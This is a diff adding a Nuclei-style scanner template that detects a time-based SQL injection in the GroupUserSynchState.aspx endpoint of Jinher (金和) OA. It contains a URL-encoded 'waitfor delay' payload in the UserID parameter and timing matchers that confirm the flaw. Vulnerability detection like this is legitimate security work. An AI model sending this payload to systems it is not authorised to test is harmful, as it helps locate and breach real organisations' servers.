@@ -1,0 +1,32 @@
+id: jinher-groupusersynchstate-sqli
+info:
+  name: 金和OA GroupUserSynchState.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    A potential SQL Injection vulnerability in the 金和OA GroupUserSynchState.aspx endpoint.
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.AddMenu/GroupUserSynchState.aspx/?UserID=%27%77%61%69%74%66%6f%72%20%64%65%6c%61%79%27%30%3a%30%3a{{t1}}%27%2d%2d&op=view HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "用户公开范围查看"
+          - "外部系统名称"
+          - "成功标识"
+          - "JHSoft"
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
